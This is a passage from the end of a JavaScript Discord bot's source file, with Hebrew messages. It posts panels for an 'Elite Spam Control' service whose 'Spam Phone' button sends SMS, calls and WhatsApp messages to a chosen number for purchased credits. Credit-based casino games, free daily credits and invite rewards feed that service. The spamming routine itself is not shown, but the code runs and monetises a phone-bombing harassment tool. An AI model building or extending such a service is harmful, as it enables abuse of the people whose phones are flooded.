                    boardButtons.push(new ButtonBuilder().setCustomId('mine_' + i).setEmoji('⬜').setStyle(ButtonStyle.Secondary));
                }

                const rows = [];
                for (let i = 0; i < 4; i++) {
                    rows.push(new ActionRowBuilder().addComponents(boardButtons.slice(i * 5, i * 5 + 5)));
                }

                rows.push(new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId('mine_cashout').setLabel('גש עם ' + amount).setStyle(ButtonStyle.Success)
                ));

                const embed = new EmbedBuilder()
                    .setTitle('💣 Mines')
                    .setDescription('**מספר מוקשים:** ' + minesCount + '\n**השקעה:** ' + amount + ' קרדיטים.\n\nלחץ על ריבועים כדי לחשוף יהלומים! 💎\nהיזהר ממוקשים! 💣')
                    .setColor(0x000000)
                    .setTimestamp();

                await interaction.reply({ embeds: [embed], components: rows });
            }
        }
    } catch (error) {
        console.error('Error in interaction handler:', error);
        if (!interaction.replied && !interaction.deferred) {
            try {
                await interaction.reply({
                    content: '❌ אירעה שגיאה, נסה שוב מאוחר יותר!',
                    ephemeral: true
                });
            } catch (e) {
                console.error('Error sending error message:', e);
            }
        }
    }
});

client.once(Events.ClientReady, async () => {
    console.log('✅ ' + client.user.tag + ' is LIVE!');
    await registerCommands();

    const guild = client.guilds.cache.get(CONFIG.GUILD_ID);
    if (guild) {
        await fetchAndStoreInvites(guild);
    }

    await updateLeaderboardMessage().catch(() => {});

    const panelCh = client.channels.cache.get(CONFIG.PANEL_CHANNEL_ID);
    if (panelCh) {
        const embed = new EmbedBuilder()
            .setTitle('🎮 Elite Spam Control')
            .setColor(0x000000)
            .setDescription('Use the buttons below to interact with the bot.\nFor more info go to <#' + CONFIG.INFO_CHANNEL_ID + '>.')
            .addFields(
                { name: '💣 Spam Phone', value: 'Sending SMS & Call & Whatsapp (costs credits)', inline: false },
                { name: '💰 My Credits', value: 'Check your balance', inline: true },
                { name: '💳 Buy Credits', value: 'Purchase more credits via our website', inline: true }
            );
        const view = new ControlPanelView();
        const messages = await panelCh.messages.fetch({ limit: 5 }).catch(() => null);
        if (messages) {
            const oldMsg = messages.find(m => m.author.id === client.user.id && m.embeds[0]?.title === '🎮 Elite Spam Control');
            if (oldMsg) await oldMsg.edit({ embeds: [embed], components: [view] });
            else await panelCh.send({ embeds: [embed], components: [view] });
        }
    }

    const freeCh = client.channels.cache.get(CONFIG.FREE_CREDITS_CHANNEL_ID);
    if (freeCh) {
        const embed = new EmbedBuilder().setTitle('🎁 קרדיטים חינם').setDescription('קבל **5 קרדיטים חינם** כל **24 שעות!**').setColor(0x000000);
        const view = new FreeCreditsView();
        const messages = await freeCh.messages.fetch({ limit: 5 }).catch(() => null);
        if (messages) {
            const oldMsg = messages.find(m => m.author.id === client.user.id && m.embeds[0]?.title === '🎁 קרדיטים חינם');
            if (oldMsg) await oldMsg.edit({ embeds: [embed], components: [view] });
            else await freeCh.send({ embeds: [embed], components: [view] });
        }
    }

    const invitesCh = client.channels.cache.get(CONFIG.INVITES_CHANNEL_ID);
    if (invitesCh) {
        const embed = new EmbedBuilder()
            .setTitle('✉️ קרדיטים מהזמנות חברים')
            .setDescription('על כל חבר שתזמינו לשרת תקבל **2 קרדיטים!**\nלחצו על הכפתור למטה כדי לבדוק ולמשוך את הקרדיטים שלכם.')
            .setColor(0xff0000);
        const view = new InviteCreditsView();
        const messages = await invitesCh.messages.fetch({ limit: 5 }).catch(() => null);
        if (messages) {
            const oldMsg = messages.find(m => m.author.id === client.user.id && m.embeds[0]?.title === '✉️ קרדיטים מהזמנות חברים');
            if (oldMsg) await oldMsg.edit({ embeds: [embed], components: [view] });
            else await invitesCh.send({ embeds: [embed], components: [view] });
        }
    }

    const boostCh = client.channels.cache.get(CONFIG.BOOST_CHANNEL_ID);
    if (boostCh) {
        const embed = new EmbedBuilder()
            .setTitle('💎 הטבות בוסטרים - קרדיטים יומיים')
            .setDescription('תודה על התמיכה שלך בשרת!\nבוסטרים זכאים לקבל **15 קרדיטים במתנה** כל 24 שעות!\n\nלחצו על הכפתור למטה כדי לאסוף את הקרדיטים שלך.')
            .setColor(0xff0000);
        const view = new BoostCreditsView();
        const messages = await boostCh.messages.fetch({ limit: 5 }).catch(() => null);
        if (messages) {
            const oldMsg = messages.find(m => m.author.id === client.user.id && m.embeds[0]?.title === '💎 הטבות בוסטרים - קרדיטים יומיים');
            if (oldMsg) await oldMsg.edit({ embeds: [embed], components: [view] });
            else await boostCh.send({ embeds: [embed], components: [view] });
        }
    }

    const inviteRewardsCh = client.channels.cache.get(CONFIG.INVITE_REWARDS_CHANNEL_ID);
    if (inviteRewardsCh) {
        const embed = new EmbedBuilder()
            .setTitle('🎁 מתנות על הזמנות חברים')
            .setDescription('זכה בקרדיטים על כל חבר שתזמין לשרת!\n\n**המטרות:**\n• 2 הזמנות → 5 קרדיטים\n• 5 הזמנות → 15 קרדיטים\n• 10 הזמנות → 35 קרדיטים\n\nלחץ על הכפתור למטה כדי לבדוק ולקבל את המתנות שלך!')
            .setColor(0xff0000);
        const view = new InviteRewardsView();
        const messages = await inviteRewardsCh.messages.fetch({ limit: 5 }).catch(() => null);
        if (messages) {
            const oldMsg = messages.find(m => m.author.id === client.user.id && m.embeds[0]?.title === '🎁 מתנות על הזמנות חברים');
            if (oldMsg) await oldMsg.edit({ embeds: [embed], components: [view] });
            else await inviteRewardsCh.send({ embeds: [embed], components: [view] });
        }
    }

    const coinflipCh = client.channels.cache.get(CONFIG.CASINO_COINFLIP_CHANNEL);
    if (coinflipCh) {
        const embed = new EmbedBuilder()
            .setTitle('🪙 Coin Flip')
            .setDescription('משחק מטע פשוט! בחר עץ או מטע וקבל סיכוי 50/50 לזכות!\n\n**כיצד לשחק:**\nהשתמש בפקודה `/coinflip <amount> <choice>`')
            .setColor(0xffd700)
            .addFields({ name: 'חוקים', value: '• בחר "heads" (עץ) או "tails" (מטע)\n• אם נצדקת - תקבל פי 2 מההשקעה\n• אם טעית - תאבד את ההשקעה' });
        const messages = await coinflipCh.messages.fetch({ limit: 5 }).catch(() => null);
        if (messages) {
            const oldMsg = messages.find(m => m.author.id === client.user.id && m.embeds[0]?.title === '🪙 Coin Flip');
            if (oldMsg) await oldMsg.edit({ embeds: [embed] });
            else await coinflipCh.send({ embeds: [embed] });
        }
    }

    const blackjackCh = client.channels.cache.get(CONFIG.CASINO_BLACKJACK_CHANNEL);
    if (blackjackCh) {
        const embed = new EmbedBuilder()
            .setTitle('♠️ Blackjack')
            .setDescription('משחק קלפים קלאסי! נסה להגיע ל-21 מבלי לחרוג!\n\n**כיצד לשחק:**\nהשתמש בפקודה `/blackjack <amount>`')
            .setColor(0x000000)
            .addFields({ name: 'חוקים', value: '• המטרה: להגיע לערך של 21 או קרוב ככל האפשר מבלי לחרוג\n• קלפי J/Q/K שווים 10, A שווה 1 או 11\n• Blackjack (21 עם שני קלפים) משלם 1.5x\n• Hit - קח קלף נוסף\n• Stand - עצור\n• Double - הכפל השקעה וקח קלף אחד' });
        const messages = await blackjackCh.messages.fetch({ limit: 5 }).catch(() => null);
        if (messages) {
            const oldMsg = messages.find(m => m.author.id === client.user.id && m.embeds[0]?.title === '♠️ Blackjack');
            if (oldMsg) await oldMsg.edit({ embeds: [embed] });
            else await blackjackCh.send({ embeds: [embed] });
        }
    }

    const rouletteCh = client.channels.cache.get(CONFIG.CASINO_ROULETTE_CHANNEL);
    if (rouletteCh) {
        const embed = new EmbedBuilder()
            .setTitle('🎰 Roulette')
            .setDescription('הגלגל המפורסם! הימור על צבע או מספר ספציפי!\n\n**כיצד לשחק:**\nהשתמש בפקודה `/roulette <amount> <bet>`')
            .setColor(0xff0000)
            .addFields({ name: 'סוגי הימורים', value: '• **red/black**: הימור על צבע (משלם 2x)\n• **green**: הימור על 0 (משלם 36x)\n• **0-36**: הימור על מספר ספציפי (משלם 36x)' });
        const messages = await rouletteCh.messages.fetch({ limit: 5 }).catch(() => null);
        if (messages) {
            const oldMsg = messages.find(m => m.author.id === client.user.id && m.embeds[0]?.title === '🎰 Roulette');
            if (oldMsg) await oldMsg.edit({ embeds: [embed] });
            else await rouletteCh.send({ embeds: [embed] });
        }
    }

    const minesCh = client.channels.cache.get(CONFIG.CASINO_MINES_CHANNEL);
    if (minesCh) {
        const embed = new EmbedBuilder()
            .setTitle('💣 Mines')
            .setDescription('חשוף יהלומים והיזהר ממוקשים! כל יהלומים שתגלה מגדילה את המכפיל!\n\n**כיצד לשחק:**\nהשתמש בפקודה `/mines <amount> <mines>`')
            .setColor(0x00ff00)
            .addFields({ name: 'חוקים', value: '• בחר מספר מוקשים (1-19)\n• לחץ על ריבועים כדי לחשוף אותם\n• כל יהלומים שתגלה מגדילה את המכפיל ב-10%\n• אתה יכול לגשת בכל עת\n• אם תחשוף מוקש - תאבד את כל ההשקעה' });
        const messages = await minesCh.messages.fetch({ limit: 5 }).catch(() => null);
        if (messages) {
            const oldMsg = messages.find(m => m.author.id === client.user.id && m.embeds[0]?.title === '💣 Mines');
            if (oldMsg) await oldMsg.edit({ embeds: [embed] });
            else await minesCh.send({ embeds: [embed] });
        }
    }
});

client.on('error', error => {
    console.error('Discord Client Error:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

// ===== RENDER KEEP-ALIVE =====
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('alive');
}).listen(PORT, () => console.log('HTTP keep-alive listening on port ' + PORT));

// ===== DB SYNC: דחיפה אחרונה לפני כיבוי =====
process.on('SIGTERM', async () => { await ghPushDb(); process.exit(0); });
process.on('SIGINT',  async () => { await ghPushDb(); process.exit(0); });

// ===== BOOT =====
(async () => {
    await ghRestoreDb();
    loadDb();
    setInterval(ghPushDb, 3 * 60 * 1000);
    await client.login(CONFIG.TOKEN);
})();
